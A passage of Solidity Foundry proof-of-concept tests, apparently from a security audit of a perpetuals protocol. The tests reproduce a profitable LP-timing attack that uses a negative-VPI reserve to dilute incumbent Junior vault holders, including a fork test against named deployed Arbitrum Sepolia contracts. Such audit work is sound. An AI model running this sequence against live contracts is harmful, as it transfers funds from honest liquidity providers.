        // Project fixture lines 1-3 (verbatim): incumbent Junior and the skew-creating SHORT.
        _fundJunior(bob, 1_000_000 * 1e6);
        _fundTrader(carol, 50_000 * 1e6);
        vm.prank(carol);
        router.commitOrder(CfdTypes.Side.SHORT, 200_000 * 1e18, 40_000 * 1e6, 1e8, false);
        bytes[] memory empty = _mockPythUpdateData();
        router.executeOrder(1, empty);

        uint256 branch = vm.snapshotState();
        Result memory attack = _runProjectSequence(true);
        assertTrue(vm.revertToState(branch));
        Result memory control = _runProjectSequence(false);

        console2.log("ATTACK gross VPI reserve locked at open", attack.reserve);
        console2.log("ATTACK pool cash decrease at open", attack.poolDrop);
        console2.log("ATTACK alice trader-account delta (project metric)", attack.aliceTraderDelta);
        console2.log("ATTACK alice total delta (trader + own 9M Junior deposit)", attack.aliceTotalDelta);
        console2.log("ATTACK bob incumbent Junior delta", attack.bobDelta);
        console2.log("ATTACK alice redeemed Junior assets", attack.redeemedAssets);
        console2.log("CONTROL alice trader-account delta", control.aliceTraderDelta);
        console2.log("CONTROL alice total delta", control.aliceTotalDelta);
        console2.log("CONTROL bob incumbent Junior delta", control.bobDelta);

        // The project's metric still passes: the lifetime clamp recovers the whole rebate from the trader account.
        assertLe(attack.aliceTraderDelta, 0, "trader account alone is not profitable (project assertion holds)");
        // ...but the same minority-VPI depth sequence is profitable for the attacker once the deposit is hers.
        assertGt(attack.aliceTotalDelta, 0, "minority VPI depth attack is profitable when the attacker is the depositor");
        assertLt(control.aliceTotalDelta, 0, "same trades with the close before activation only cost fees");
        assertLt(attack.bobDelta, control.bobDelta, "the incumbent Junior pays the attacker's gain");
        assertEq(attack.reserve, attack.poolDrop, "pool cash leaves one-for-one into the locked VPI reserve");
    }

    function _runProjectSequence(
        bool closeAfterActivation
    ) internal returns (Result memory r) {
        // Project fixture (verbatim): alice funds 50k and opens the minority (skew-reducing) LONG.
        _fundTrader(alice, 50_000 * 1e6);
        address aliceAccount = alice;
        uint256 aliceBalBefore = clearinghouse.balanceAssets(aliceAccount);
        uint256 aliceWalletBefore = settlementToken.balanceOf(alice);
        uint256 bobBefore = juniorVault.convertToAssets(juniorVault.balanceOf(bob));

        uint256 poolBeforeOpen = pool.totalAssets();
        vm.prank(alice);
        router.commitOrder(CfdTypes.Side.LONG, 100_000 * 1e18, 10_000 * 1e6, 1e8, false);
        bytes[] memory empty = _mockPythUpdateData();
        router.executeOrder(2, empty);
        r.reserve = clearinghouse.vpiRebateReserveAssets(aliceAccount);
        r.poolDrop = poolBeforeOpen - pool.totalAssets();
        (,,,,,, int256 vpiAccrued) = engine.positions(aliceAccount);
        assertEq(r.reserve, uint256(-vpiAccrued), "exact gross negative-VPI backing");

        if (!closeAfterActivation) {
            _projectClose();
        }

        // The changed argument vs the project test: `_fundJuniorDelayed(bob, 9_000_000 * 1e6)` -> depositor is alice.
        _fundJuniorDelayed(alice, LP_CAPITAL);

        if (closeAfterActivation) {
            _projectClose();
        }
        assertEq(clearinghouse.vpiRebateReserveAssets(aliceAccount), 0, "reserve consumed by the clamp-forced clawback");

        uint256 aliceBalAfter = clearinghouse.balanceAssets(aliceAccount);
        // Project assertion, unchanged.
        assertLe(aliceBalAfter, aliceBalBefore, "Minority VPI depth attack must not be profitable");

        // Exit through the project's own helper after the one-hour activation cooldown, refreshing the mark first
        // exactly as the project's `test_SizeAdditionCannotBypassVpiBound` does before calling the same helper.
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        router.updateMarkPrice(_mockPythUpdateData());
        r.redeemedAssets = _settleAvailableJuniorWithdrawal(alice);
        assertGt(r.redeemedAssets, 0, "alice exits through the project helper");
        uint256 residualShareValue = juniorVault.convertToAssets(juniorVault.balanceOf(alice));

        r.aliceTraderDelta = int256(aliceBalAfter) - int256(aliceBalBefore);
        r.aliceTotalDelta = int256(clearinghouse.balanceAssets(aliceAccount) + settlementToken.balanceOf(alice)
                + residualShareValue) - int256(aliceBalBefore + aliceWalletBefore + LP_CAPITAL);
        r.bobDelta = int256(juniorVault.convertToAssets(juniorVault.balanceOf(bob))) - int256(bobBefore);
    }

    function _projectClose() internal {
        vm.prank(alice);
        router.commitOrder(CfdTypes.Side.LONG, 100_000 * 1e18, 0, 0, true);
        bytes[] memory closePrice = _mockPythUpdateData();
        vm.warp(block.timestamp + 1);
        vm.roll(block.number + 1);
        router.executeOrder(3, closePrice);
    }

}
```

### Source: `packages/perps/test/poc/VpiReserveEntryDilutionDeployedFork.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";

interface IMockUSDG {

    function mint(
        address to,
        uint256 amount
    ) external;
    function balanceOf(
        address account
    ) external view returns (uint256);
    function approve(
        address spender,
        uint256 amount
    ) external returns (bool);

}

interface IRealPyth {

    function getPriceUnsafe(
        bytes32 id
    ) external view returns (int64 price, uint64 conf, int32 expo, uint256 publishTime);

}

/// @dev Foundry forks do not execute Arbitrum's native ArbSys precompile; the Router reads the L2 block through it.
contract ArbSysBlockNumberShim {

    function arbBlockNumber() external view returns (uint256) {
        return block.number;
    }

}

/// @notice Negative-VPI reserve / Junior-activation transfer reproduced against the DEPLOYED Arbitrum Sepolia v2.0.0
///         release (source 1209ca8a, no packages/perps/src diff to audit commit a82d4fef). All protocol contracts are
///         the deployed bytecode; the nineteen on the exercised path are checked against the release manifest's
///         runtime code hashes. Only out-of-scope dependencies are replaced: Pyth is etched with the suite's MockPyth
///         and replays the real Arbitrum Sepolia Pyth prices and confidences stored at the fork block, and ArbSys is
///         shimmed. MockUSDG is the deployed, publicly mintable test token. All trades use the production V3
///         `OrderRouter.commitOrder(OrderRequest)` and `executeOrder`; LP epochs use `OrderRouter.settleLpEpoch`;
///         LP actions use public vault methods.
contract VpiReserveEntryDilutionDeployedForkTest is Test {

    // Thu 2026-10-29 14:00 UTC. The deployed pool holds 2,000,002 USDG (1M Senior + 1M Junior + 1 USDG seeds), no
    // positions. Live FX hours, outside FAD/frozen windows for the whole test timeline.
    uint256 internal constant FORK_BLOCK = 324_032_051;

    address internal constant PYTH = address(bytes20(hex"0b73614636c855bf23f342f307fb981a3e47f42b"));
    address internal constant ARB_SYS = address(100);
    address internal constant DEPLOYER_LP = address(bytes20(hex"5a71a4094ec81165ada48aa4c27da48ec27e0d6b"));
    IMockUSDG internal constant USDG = IMockUSDG(address(bytes20(hex"3d051dbbf5ff427a4ae8ad09746902666af8fb9d")));
    MarginClearinghouse internal constant CH =
        MarginClearinghouse(address(bytes20(hex"b5b851f627d6df3cf3f096e23e20a58884d7b89a")));
    CfdEngine internal constant ENGINE = CfdEngine(address(bytes20(hex"ca18a6783d7542f9d2f28f4f259772b74c4d6baa")));
    HousePool internal constant POOL = HousePool(address(bytes20(hex"eb5604c393843b2f3c347ec24fa9ddad6ab2131e")));
    TrancheVault internal constant SENIOR =
        TrancheVault(address(bytes20(hex"5dc42ba5a1e8dd3e1b6868d10f66a9bf8fb5b83d")));
    TrancheVault internal constant JUNIOR =
        TrancheVault(address(bytes20(hex"4a8b67184a1e3224c11a191cc69f22c50eef734e")));
    OrderRouter internal constant ROUTER = OrderRouter(address(bytes20(hex"918663d6da8cb33b325a04c4a5e8c51d42f3b444")));
    PletherOracle internal constant ORACLE =
        PletherOracle(address(bytes20(hex"4f2c62a0e03657f52c633c19c11f88d8f0897bb2")));

    address internal constant SENIOR_LP = address(0x5E110001);
    address internal constant JUNIOR_LP = address(0xB0B60001);
    address internal constant LONG_TRADER = address(0x10A60001);
    address internal constant SHORT_TRADER = address(0x5A0A7001);
    address internal constant ATTACKER = address(0xA77A0001);
    address internal constant KEEPER = address(0xCEE20001);

    uint256 internal constant LOT = 1e20;
    // Largest round size whose SHORT max-profit (lots x (CAP - mark)) fits the ~10M pool at the real ~0.96 mark.
    uint256 internal constant BOOK_SIZE = 95_000 * LOT;
    uint256 internal constant SENIOR_ADD = 6_900_000e6; // deployed 1M + 6.9M = 7.9M honest Senior
    uint256 internal constant JUNIOR_ADD = 1_100_000e6; // deployed 1M + 1.1M = 2.1M incumbent Junior
    uint256 internal constant ENTRANT_ASSETS = 1_050_000e6;
    uint256 internal constant ATTACKER_TRADER_ASSETS = 125_000e6;
    uint256 internal constant ATTACK_MARGIN = 100_000e6;
    uint256 internal constant BUILD_MARGIN = 50_000e6;

    bytes32[] internal feedIds;
    int64[] internal feedPrices;
    uint64[] internal feedConfs;
    int32[] internal feedExpos;
    uint256 internal clientNonce;

    struct Outcome {
        uint256 reserve;
        uint256 poolDrop;
        int256 attackerDelta;
        int256 incumbentJuniorDelta;
        int256 honestSeniorDelta;
        uint256 redeemedAssets;
    }

    function setUp() public {
        vm.createSelectFork(vm.envString("ARB_SEPOLIA_RPC_URL"), FORK_BLOCK);
        assertEq(block.chainid, 421_614, "Arbitrum Sepolia");
        _assertDeployedBytecode();

        // Capture the real Pyth prices/confidences the deployed oracle would read, then replace Pyth (out of scope).
        uint256 n;
        while (true) {
            try ORACLE.pythFeedIds(n) returns (bytes32 id) {
                (int64 p, uint64 c, int32 e,) = IRealPyth(PYTH).getPriceUnsafe(id);
                feedIds.push(id);
                feedPrices.push(p);
                feedConfs.push(c);
                feedExpos.push(e);
                ++n;
            } catch {
                break;
            }
        }
        assertEq(n, 6, "six-feed release basket");
        vm.etch(PYTH, address(new MockPyth()).code);
        for (uint256 slot; slot < 12; ++slot) {
            vm.store(PYTH, bytes32(slot), bytes32(0));
        }
        MockPyth(PYTH).setFee(1);
        for (uint256 i; i < n; ++i) {
            MockPyth(PYTH).setPrice(feedIds[i], feedPrices[i], feedConfs[i], feedExpos[i], 0);
        }
        vm.etch(ARB_SYS, address(new ArbSysBlockNumberShim()).code);
        vm.deal(KEEPER, 100 ether);
    }

    function testFork_realConfidence_seniorBackedAttackVsControl() public {
        _runScenario("real Pyth confidence at fork block");
    }

    function testFork_maxConfidence_seniorBackedAttackVsControl() public {
        // Same scenario with every feed at ~9.5 bps confidence (release basket cap is 10 bps), as in the harness PoCs.
        for (uint256 i; i < feedIds.length; ++i) {
            feedConfs[i] = uint64(uint256(int256(feedPrices[i])) * 95 / 100_000);
        }
        _runScenario("max confidence (9.5 bps per feed)");
    }

    function testFork_realConfidence_threeConsecutiveCycles() public {
        _buildState();
        int256 attackerTotal;
        int256 incumbentTotal;
        for (uint256 i; i < 3; ++i) {
            Outcome memory cycle = _cycle(true);
            attackerTotal += cycle.attackerDelta;
            incumbentTotal += cycle.incumbentJuniorDelta;
            console2.log("cycle", i + 1);
            console2.log("  reserve", cycle.reserve);
            console2.log("  attacker delta", cycle.attackerDelta);
            console2.log("  incumbent Junior delta", cycle.incumbentJuniorDelta);
            assertGt(cycle.attackerDelta, 0, "every cycle is profitable on the deployed release");
        }
        console2.log("three-cycle attacker total", attackerTotal);
        console2.log("three-cycle incumbent Junior total", incumbentTotal);
    }

    function _runScenario(
        string memory label
    ) internal {
        console2.log("SCENARIO", label);
        _buildState();

        uint256 snap = vm.snapshotState();
        Outcome memory attack = _cycle(true);
        assertTrue(vm.revertToState(snap));
        Outcome memory control = _cycle(false);

        console2.log("gross VPI reserve", attack.reserve);
        console2.log("pool cash decrease at reducing open", attack.poolDrop);
        console2.log("ATTACK attacker delta", attack.attackerDelta);
        console2.log("ATTACK incumbent Junior delta (deployed LP + JUNIOR_LP)", attack.incumbentJuniorDelta);
        console2.log("ATTACK honest Senior delta (deployed LP + SENIOR_LP)", attack.honestSeniorDelta);
        console2.log("ATTACK attacker redeemed assets", attack.redeemedAssets);
        console2.log("CONTROL attacker delta", control.attackerDelta);
        console2.log("CONTROL incumbent Junior delta", control.incumbentJuniorDelta);
        console2.log("CONTROL honest Senior delta", control.honestSeniorDelta);

        assertEq(attack.reserve, attack.poolDrop, "pool cash leaves one-for-one into the dedicated reserve");
        assertGt(attack.attackerDelta, 0, "attack is profitable on the deployed release");
        assertLt(control.attackerDelta, 0, "same trades closed before activation only cost money");
        assertLt(attack.incumbentJuniorDelta, control.incumbentJuniorDelta, "incumbent Junior funds the gain");
    }

    function _buildState() internal {
        _refreshMark();
        console2.log("deployed pool assets at fork", POOL.totalAssets());
        console2.log("deployed basket mark", ENGINE.lastMarkPrice());

        // Honest liquidity through public vault requests and Router epoch settlement.
        _fundTranche(JUNIOR, JUNIOR_LP, JUNIOR_ADD);
        _fundTranche(SENIOR, SENIOR_LP, SENIOR_ADD);
        console2.log("pool assets after honest LP funding", POOL.totalAssets());
        console2.log("senior principal", POOL.seniorPrincipal());
        console2.log("junior principal", POOL.juniorPrincipal());

        // Unrelated traders build a balanced book through cap-compliant opens; the SHORT then closes (closes have no
        // skew cap), leaving a one-sided LONG of ~91% of depth.
        _fundTrader(LONG_TRADER, 250_000e6);
        _fundTrader(SHORT_TRADER, 250_000e6);
        uint256[3] memory chunks = [uint256(39_000), uint256(39_000), uint256(17_000)];
        for (uint256 i; i < 3; ++i) {
            _routerTrade(LONG_TRADER, CfdTypes.Side.LONG, chunks[i] * LOT, BUILD_MARGIN, false);
            _routerTrade(SHORT_TRADER, CfdTypes.Side.SHORT, chunks[i] * LOT, BUILD_MARGIN, false);
        }
        _routerTrade(SHORT_TRADER, CfdTypes.Side.SHORT, BOOK_SIZE, 0, true);
        (, uint256 longOi,,) = ENGINE.sides(0);
        (, uint256 shortOi,,) = ENGINE.sides(1);
        assertEq(longOi, BOOK_SIZE, "standing LONG");
        assertEq(shortOi, 0, "close-created one-sided book");
        console2.log("standing LONG notional", BOOK_SIZE / 1e20 * ENGINE.lastMarkPrice());
        console2.log("pool assets before cycle", POOL.totalAssets());
        _fundTrader(ATTACKER, ATTACKER_TRADER_ASSETS);
    }

    function _cycle(
        bool straddle
    ) internal returns (Outcome memory out) {
        USDG.mint(ATTACKER, ENTRANT_ASSETS);
        int256 attackerBefore = int256(_attackerWealth());
        int256 juniorBefore = int256(_juniorValue(JUNIOR_LP) + _juniorValue(DEPLOYER_LP));
        int256 seniorBefore = int256(_seniorValue(SENIOR_LP) + _seniorValue(DEPLOYER_LP));

        _refreshMark();
        vm.startPrank(ATTACKER);
        USDG.approve(address(JUNIOR), ENTRANT_ASSETS);
        uint256 depositId = JUNIOR.requestDeposit(ENTRANT_ASSETS, ATTACKER, ATTACKER);
        vm.stopPrank();
        uint256 activation = JUNIOR.depositEpochStart(depositId);

        _warpTo(activation - 30);
        uint256 poolBefore = POOL.totalAssets();
        _routerTrade(ATTACKER, CfdTypes.Side.SHORT, BOOK_SIZE, ATTACK_MARGIN, false);
        out.reserve = CH.vpiRebateReserveAssets(ATTACKER);
        out.poolDrop = poolBefore - POOL.totalAssets();
        if (!straddle) {
            _routerTrade(ATTACKER, CfdTypes.Side.SHORT, BOOK_SIZE, 0, true);
        }

        _warpTo(activation);
        _settleLpEpoch();
        uint256 claimable = JUNIOR.claimableDepositRequest(depositId, ATTACKER);
        assertEq(claimable, ENTRANT_ASSETS, "entrant deposit activates on the deployed pool");
        vm.prank(ATTACKER);
        JUNIOR.claimDeposit(depositId, claimable, ATTACKER, ATTACKER);

        if (straddle) {
            _routerTrade(ATTACKER, CfdTypes.Side.SHORT, BOOK_SIZE, 0, true);
        }
        assertEq(CH.vpiRebateReserveAssets(ATTACKER), 0, "reserve consumed by the clamp-forced clawback");

        _warpTo(vm.getBlockTimestamp() + 1 hours + 2);
        _refreshMark();
        uint256 shares = JUNIOR.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        uint256 redeemId = JUNIOR.requestRedeem(shares, ATTACKER, ATTACKER);
        _warpTo(redeemId * 1 hours);
        _settleLpEpoch();
        out.redeemedAssets = JUNIOR.claimableRedeemAssets(redeemId, ATTACKER);
        assertGt(out.redeemedAssets, 0, "entrant redemption funded");
        vm.prank(ATTACKER);
        JUNIOR.withdraw(out.redeemedAssets, ATTACKER, ATTACKER);

        (, uint256 longOi,,) = ENGINE.sides(0);
        (, uint256 shortOi,,) = ENGINE.sides(1);
        assertEq(longOi, BOOK_SIZE, "unrelated standing LONG survives");
        assertEq(shortOi, 0, "attacker SHORT fully closed");

        out.attackerDelta = int256(_attackerWealth()) - attackerBefore;
        out.incumbentJuniorDelta = int256(_juniorValue(JUNIOR_LP) + _juniorValue(DEPLOYER_LP)) - juniorBefore;
        out.honestSeniorDelta = int256(_seniorValue(SENIOR_LP) + _seniorValue(DEPLOYER_LP)) - seniorBefore;
    }

    // ----------------------------------------------------------------- helpers

    function _assertDeployedBytecode() internal view {
        // runtimeCodeHash values from deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/manifest.json
        assertEq(
            address(ENGINE).codehash, 0xa0f8e5be6e622a5a83e46e88f6b012757ef924cf613a50cba52a2b5c66b76a6b, "engine"
        );
        assertEq(
            address(bytes20(hex"802a0755413fb966b397155b5c5cc0198e6bed3f")).codehash,
            0x16f6c8107b8f2965f1074df12878802c20aac2a54121c4c60854b29e1f18a9f1,
            "planner"
        );
        assertEq(
            address(bytes20(hex"7fcc97330a21074c388fdef729d582df261b883d")).codehash,
            0xda0a1f2e3ede6134ff938541a61890db5c4ccc4c0cafdfed0b6a2196303ef219,
            "planning reader"
        );
        assertEq(
            address(bytes20(hex"d3ede337e042d5aa6ba68e03d0c885b3d4a062dc")).codehash,
            0x540083c758046571c5770f9950282eef938986ff41d78538109ddf549534b059,
            "settlement sidecar"
        );
        assertEq(
            address(bytes20(hex"61c7f7cf91c295a86250e1e05a91901e8e1e51a3")).codehash,
            0x181223a2ac1c4fc3811d6bac5bc882310ff933d5450ffce6de5cf0c44aeb55b9,
            "terminal NAV book"
        );
        assertEq(address(POOL).codehash, 0x5e684cc82bfc5b697a24c80ef26910cfbe25efbe6fb2ca184c421808b5ced957, "pool");
        assertEq(
            address(bytes20(hex"70cd3b39bc5a006784777048c7b690f10642cbf1")).codehash,
            0x6bd056f471727898e21e8cb0d2a77efcb5a0f87e1d853a17a3a12b316812c65a,
            "redemption math sidecar"
        );
        assertEq(
            address(SENIOR).codehash, 0x1ef72eae70097e0207bbe8b4399d0b0e79910c40d6665a42f2c933b037355d8a, "senior"
        );
        assertEq(
            address(JUNIOR).codehash, 0x8d00d3d0273b7a321cbf61232ea79ef0b503fe0d83bb52609321765a0a04f3bf, "junior"
        );
        assertEq(address(CH).codehash, 0xc8e4965893dbd7073303303e9d5ab9c775aabcc1259635e4993fc7fdb0681398, "clearing");
        assertEq(address(ROUTER).codehash, 0x6c65de67ef2824572537e3641a71100100c49d909b196c43e5d271312534d3cf, "router");
        assertEq(
            address(bytes20(hex"0ae016ef599bcdf0bbbedba441401c3b6c6184ea")).codehash,
            0xfc72fcbe4496d0d5356e96d259536cd4edcb926dd7fe1473a4275ddfb09cb57e,
            "execution sidecar"
        );
        assertEq(
            address(bytes20(hex"7e51e12d77e77d33835cbafe17ce11398714974b")).codehash,
            0x39aabdb68c7d12701493d8d35b1e62c538f63a5ed673de6f716eb938321a9458,
            "policy evaluator"
        );
        assertEq(
            address(bytes20(hex"327d5fd04e17d96dd5c4f845a0b4256a9e19645c")).codehash,
            0xc3f34d5c32716e1818e1ae1cf5e14892a639bc35f15894610e619afe648ba554,
            "lifecycle book"
        );
        assertEq(address(ORACLE).codehash, 0x1ecb1ca760e7ba51d958697eeefe06ff7ba1a3ad162b3e7978af3df30393bc13, "oracle");
        assertEq(
            address(bytes20(hex"7b605d7c57c191379822705d8510109d4b2573aa")).codehash,
            0x8420be926293c70a880b5f12c07674861563727a04aca954323004855807c8f7,
            "router keeper sidecar"
        );
        assertEq(
            address(bytes20(hex"2df705806c0013e75e36fad4d6595c998f4295be")).codehash,
            0x8fb495ac2ca692f9d40f7ad29907bdb8a0154140294cf0f16b263ca0db7cb7ff,
            "order recovery sidecar"
        );
        assertEq(
            address(bytes20(hex"82fc00d77e86c52e2480459d07ad6220f1106413")).codehash,
            0xffcf90edaa061400b7fbf0272a3bc6bed52aab23833bbf6346654b23a4598e2f,
            "engine protocol lens"
        );
        assertEq(
            address(bytes20(hex"fca322c6868cef53bd5c344628f9874712e48108")).codehash,
            0x3af6c7539add5ddd3b517ad7397e717259f63637635cd947495675164d82d1a4,
            "engine lens"
        );
    }

    function _priceData(
        uint256 publishTime,
        uint256 prevPublishTime
    ) internal view returns (bytes[] memory data) {
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](feedIds.length);
        for (uint256 i; i < feedIds.length; ++i) {
            updates[i] = MockPyth.FeedUpdate({
                id: feedIds[i],
                price: MockPyth.MockPrice({
                    price: feedPrices[i],
                    conf: feedConfs[i],
                    expo: feedExpos[i],
                    publishTime: publishTime,
                    prevPublishTime: prevPublishTime
                })
            });
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }

    function _warpTo(
        uint256 timestamp
    ) internal {
        vm.warp(timestamp);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _refreshMark() internal {
        _warpTo(vm.getBlockTimestamp() + 1);
        bytes[] memory data = _priceData(vm.getBlockTimestamp(), vm.getBlockTimestamp() - 1);
        uint256 fee = ORACLE.getUpdateFee(data);
        vm.prank(KEEPER);
        ROUTER.updateMarkPrice{value: fee}(data);
    }

    function _settleLpEpoch() internal {
        _warpTo(vm.getBlockTimestamp() + 1);
        bytes[] memory data = _priceData(vm.getBlockTimestamp(), vm.getBlockTimestamp() - 1);
        uint256 fee = ORACLE.getUpdateFee(data);
        vm.prank(KEEPER);
        ROUTER.settleLpEpoch{value: fee}(data);
    }

    function _routerTrade(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal {
        uint256 window = ROUTER.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode("vpi-reserve-poc", account, ++clientNonce)),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: IOrderLifecycleBook(ROUTER.lifecycleBook()).currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        uint256 commitTime = vm.getBlockTimestamp();
        vm.prank(account);
        uint64 id = ROUTER.commitOrder(request);

        _warpTo(commitTime + 1);
        bytes[] memory data = _priceData(commitTime + 1, commitTime);
        uint256 fee = ORACLE.getOrderExecutionFee(data);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = ROUTER.executeOrder{value: fee}(id, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "deployed Router executes");
    }

    function _fundTrader(
        address trader,
        uint256 amount
    ) internal {
        USDG.mint(trader, amount);
        vm.startPrank(trader);
        USDG.approve(address(CH), amount);
        CH.deposit(trader, amount);
        vm.stopPrank();
    }

    function _fundTranche(
        TrancheVault vault,
        address lp,
        uint256 assets
    ) internal {
        _refreshMark();
        USDG.mint(lp, assets);
        vm.startPrank(lp);
        USDG.approve(address(vault), assets);
        uint256 id = vault.requestDeposit(assets, lp, lp);
        vm.stopPrank();
        _warpTo(vault.depositEpochStart(id));
        _settleLpEpoch();
        uint256 claimable = vault.claimableDepositRequest(id, lp);
        assertEq(claimable, assets, "honest deposit activates");
        vm.prank(lp);
        vault.claimDeposit(id, claimable, lp, lp);
    }

    function _attackerWealth() internal view returns (uint256) {
        return USDG.balanceOf(ATTACKER) + CH.balanceAssets(ATTACKER) + _juniorValue(ATTACKER);
    }

    function _juniorValue(
        address account
    ) internal view returns (uint256) {
        return JUNIOR.convertToAssets(JUNIOR.balanceOf(account));
    }

    function _seniorValue(
        address account
    ) internal view returns (uint256) {
        return SENIOR.convertToAssets(SENIOR.balanceOf(account));
    }

}
```

### Source: `packages/perps/test/poc/VpiReserveEntryDilution.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {AccountLensViewTypes} from "@plether/perps/interfaces/AccountLensViewTypes.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {console2} from "forge-std/console2.sol";

/// @notice A fully funded negative-lifetime-VPI reserve is guaranteed to be clawed back on close, but is excluded
///         from LP NAV while it sits in the clearinghouse. A Junior LP can activate between the pool payout and the
///         clawback, buy shares at the temporary NAV dip, then close and capture part of the restored value.
///
///         The opening skew cap is not a persistent skew cap: ordinary closes can leave a one-sided book near the
///         pool's liability limit.
///         Here all exposure is built by cap-compliant Router opens: 9.8M LONG and 9.8M SHORT. The SHORT closes,
///         leaving a repeatable 9.8M LONG skew on a roughly 10M pool. The attacker's risk-reducing 9.8M SHORT open is
///         allowed because its post-open skew is zero and creates a roughly 48k USDG guaranteed VPI reserve.
contract VpiReserveEntryDilutionTest is BasePerpTest {

    address internal constant VICTIM_LP = address(0xB0B10001);
    address internal constant LONG_TRADER = address(0x10A60001);
    address internal constant SHORT_TRADER = address(0x5A0A7001);
    address internal constant ATTACKER = address(0xA77A0001);
    address internal constant KEEPER = address(0xCEE20001);

    // Monday 2026-11-09 10:00:00 UTC: live FX hours and outside FAD/frozen regimes.
    uint256 internal constant T0 = 1_794_218_400;
    uint256 internal constant PRICE = 1e8;
    uint256 internal constant LOT = 1e20;
    uint256 internal constant BOOK_LOTS = 98_000; // 9.8M USDG at PRICE (one lot = 100 USDG).
    uint256 internal constant BOOK_SIZE = BOOK_LOTS * LOT;
    uint256 internal constant VICTIM_ASSETS = 10_000_000e6;
    uint256 internal constant ATTACKER_LP_ASSETS = 10_000_000e6;
    uint256 internal constant BUILD_MARGIN = 50_000e6;
    uint256 internal constant ATTACK_MARGIN = 100_000e6;

    struct Outcome {
        int256 victimDelta;
        int256 attackerDelta;
        uint256 vpiReserve;
        uint256 poolDropWhileReserved;
        uint256 redeemedAssets;
        uint256 treasuryDelta;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function test_overCapNegativeVpiReserveEntryDilutesIncumbentJunior() public {
        _configureReleaseAndBuildStandingSkew();

        uint256 branch = vm.snapshotState();
        Outcome memory attack = _runLpTimingScenario(true);
        assertTrue(vm.revertToState(branch));
        Outcome memory control = _runLpTimingScenario(false);

        console2.log("ATTACK victim delta", attack.victimDelta);
        console2.log("ATTACK attacker delta", attack.attackerDelta);
        console2.log("ATTACK guaranteed VPI reserve", attack.vpiReserve);
        console2.log("ATTACK pool drop while reserve outstanding", attack.poolDropWhileReserved);
        console2.log("ATTACK redeemed assets", attack.redeemedAssets);
        console2.log("ATTACK treasury delta", attack.treasuryDelta);
        console2.log("CONTROL victim delta", control.victimDelta);
        console2.log("CONTROL attacker delta", control.attackerDelta);
        console2.log("CONTROL treasury delta", control.treasuryDelta);

        assertGt(attack.vpiReserve, 40_000e6, "close-created over-cap skew yields >40k guaranteed reserve");
        assertApproxEqAbs(
            attack.poolDropWhileReserved,
            attack.vpiReserve,
            2e6,
            "pool pays the gross reserve (net rebate plus protocol-fee top-up)"
        );
        assertGt(attack.attackerDelta, 8_000e6, "attacker profits after fees and max release confidence shift");
        assertLt(attack.victimDelta, -15_000e6, "incumbent Junior loses principal to the JIT entrant");
        assertLt(control.attackerDelta, 0, "same Router round trip without reserve-straddling only costs money");
        assertGt(
            attack.attackerDelta - control.attackerDelta,
            18_000e6,
            "moving only LP activation between open and close transfers >18k to attacker"
        );
        assertLt(
            attack.victimDelta - control.victimDelta,
            -18_000e6,
            "moving only LP activation between open and close transfers >18k from incumbent"
        );

        // The attacker's full close recreates the same 9.8M one-sided LONG skew, so another cycle is possible.
        assertEq(_sideOpenInterest(CfdTypes.Side.LONG), BOOK_SIZE, "standing LONG remains");
        assertEq(_sideOpenInterest(CfdTypes.Side.SHORT), 0, "attacker close recreates one-sided skew");
    }

    function test_threeConsecutiveCyclesReuseSameStandingSkew() public {
        _configureReleaseAndBuildStandingSkew();

        int256 cumulativeAttacker;
        int256 cumulativeVictim;
        for (uint256 i; i < 3; ++i) {
